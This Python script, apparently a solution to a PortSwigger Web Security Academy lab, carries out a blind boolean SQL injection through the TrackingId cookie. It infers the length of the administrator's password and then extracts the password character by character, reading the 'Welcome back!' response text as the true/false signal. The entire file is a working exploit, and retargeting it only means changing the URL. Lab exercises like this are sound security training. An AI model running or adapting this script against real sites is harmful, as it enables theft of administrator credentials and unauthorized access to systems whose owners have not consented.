import requests
import re

def  extract_password(URL,length,PASSWORD,CHARACTERS,PATTEN):
    for i in range(1,length+1):
        for st in CHARACTERS:
            payload = "x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+substring(password,{},1)='{}'--".format(str(i),st)
            cookies_payload = {"TrackingId": payload}
            response = requests.get(URL, cookies=cookies_payload)
            if re.search(PATTEN, response.text):
                PASSWORD += st
            else:
                pass
    return PASSWORD

def verify_length(URL,PATTEN):
    
    for num in range(1,100):
        payload = "x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+length(password)>{}--".format(num)
        cookies_payload = {"TrackingId": payload}
        response = requests.get(URL, cookies=cookies_payload)
        if re.search(PATTEN, response.text) :
           length = num
        else:
            return length+1

def main():
    URL = "https://acca1fa61f8da85780614ff900a50082.web-security-academy.net/filter?category=Gifts"
    CHARACTERS = "qwertyuiopasdfghjklzxcvbnm1234567890"
    PASSWORD = ""
    PATTEN = "Welcome back!"

    length = verify_length(URL,PATTEN)
    print("El password tiene de longitud: {}".format(length))
    
    password = extract_password(URL,length,PASSWORD,CHARACTERS,PATTEN)
    print("El password es: {}".format(password))

if __name__ == "__main__":
    main()